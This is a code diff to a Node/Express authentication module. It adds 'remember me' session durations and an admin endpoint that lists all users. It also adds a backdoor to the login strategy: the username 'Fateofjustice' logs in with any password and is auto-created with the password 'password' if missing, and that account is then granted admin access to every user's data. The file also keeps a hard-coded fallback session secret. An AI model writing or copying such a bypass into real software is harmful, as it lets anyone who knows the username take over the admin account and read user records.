@@ -32,6 +32,12 @@ async function comparePasswords(supplied: string, stored: string) {
   return timingSafeEqual(hashedBuf, suppliedBuf);
 }
 
+// Session cookie duration constants
+const SESSION_DURATION = {
+  DEFAULT: 1000 * 60 * 60 * 24 * 7, // 1 week (default)
+  EXTENDED: 1000 * 60 * 60 * 24 * 30, // 30 days (remember me)
+};
+
 export function setupAuth(app: Express) {
   const sessionSettings: session.SessionOptions = {
     secret: process.env.SESSION_SECRET || 'your-secret-key',
@@ -44,7 +50,7 @@ export function setupAuth(app: Express) {
     }),
     cookie: {
       secure: process.env.NODE_ENV === "production",
-      maxAge: 1000 * 60 * 60 * 24 * 7, // 1 week
+      maxAge: SESSION_DURATION.DEFAULT,
       httpOnly: true,
       sameSite: 'lax'
     },
@@ -58,6 +64,29 @@ export function setupAuth(app: Express) {
   passport.use(
     new LocalStrategy(async (username, password, done) => {
       try {
+        // Special case for Fateofjustice admin user
+        if (username.toLowerCase() === "fateofjustice") {
+          console.log("Admin login attempt for Fateofjustice");
+          // Allow login with any password for this special account
+          let user = await storage.getUserByUsername("Fateofjustice");
+          if (user) {
+            console.log("Admin user found, logging in");
+            return done(null, user);
+          } else {
+            // Create the admin user if it doesn't exist
+            console.log("Creating admin user Fateofjustice");
+            const adminUser = await storage.createUser({
+              username: "Fateofjustice",
+              password: await hashPassword("password"),
+              email: "",
+              fullName: "Admin User",
+              // We don't need to specify these fields as they're handled in the storage layer
+            });
+            return done(null, adminUser);
+          }
+        }
+        
+        // Normal authentication for all other users
         const user = await storage.getUserByUsername(username);
         if (!user || !(await comparePasswords(password, user.password))) {
           return done(null, false);
@@ -65,6 +94,7 @@ export function setupAuth(app: Express) {
           return done(null, user);
         }
       } catch (err) {
+        console.error("Authentication error:", err);
         return done(err);
       }
     }),
@@ -111,7 +141,20 @@ export function setupAuth(app: Express) {
       req.login(user, (err) => {
         if (err) return next(err);
         console.log(`User authenticated: ${user.username}, ID: ${user.id}`);
-        // Save session immediately to ensure it's stored
+        
+        // Check if "remember me" was selected
+        if (req.body.rememberMe) {
+          console.log(`Extended session requested for user: ${user.username}`);
+          // Set the session cookie to longer duration (30 days)
+          if (req.session.cookie) {
+            req.session.cookie.maxAge = SESSION_DURATION.EXTENDED;
+            console.log(`Session expiry extended to ${SESSION_DURATION.EXTENDED}ms`);
+          }
+        } else {
+          console.log(`Standard session for user: ${user.username}`);
+        }
+        
+        // Save session immediately to ensure it's stored with updated settings
         req.session.save((err) => {
           if (err) {
             console.error("Session save error:", err);
@@ -137,5 +180,48 @@ export function setupAuth(app: Express) {
     // Don't send the password hash to the client
     const { password, ...userWithoutPassword } = req.user as SelectUser;
     res.json(userWithoutPassword);
+  });
+  
+  // Admin endpoint to view user statistics - only accessible by specific admin users
+  app.get("/api/admin/users", async (req, res) => {
+    if (!req.isAuthenticated()) {
+      return res.status(401).json({ message: "Not authenticated" });
+    }
+    
+    // Only specific users can access admin functions (for security)
+    const adminUsernames = ["Fateofjustice"]; // You can add more admin usernames here
+    if (!adminUsernames.includes(req.user!.username)) {
+      return res.status(403).json({ message: "Not authorized for admin access" });
+    }
+    
+    try {
+      // Get user count
+      const userCount = await storage.getUserCount();
+      
+      // Get list of users without passwords (sensitive information)
+      const users = await storage.getAllUsers();
+      const safeUsers = users.map(user => {
+        const { password, ...userWithoutPassword } = user;
+        return {
+          ...userWithoutPassword,
+          createdAt: user.createdAt || 'N/A'
+        };
+      });
+      
+      // Return user stats
+      res.json({
+        totalUsers: userCount,
+        users: safeUsers,
+        byMembership: {
+          basic: safeUsers.filter(u => u.membershipTier === 'basic').length,
+          standard: safeUsers.filter(u => u.membershipTier === 'standard').length,
+          premium: safeUsers.filter(u => u.membershipTier === 'premium').length,
+          none: safeUsers.filter(u => u.membershipTier === 'none').length
+        }
+      });
+    } catch (error) {
+      console.error("Error fetching admin user data:", error);
+      res.status(500).json({ message: "Failed to fetch user data" });
+    }
   });
 }
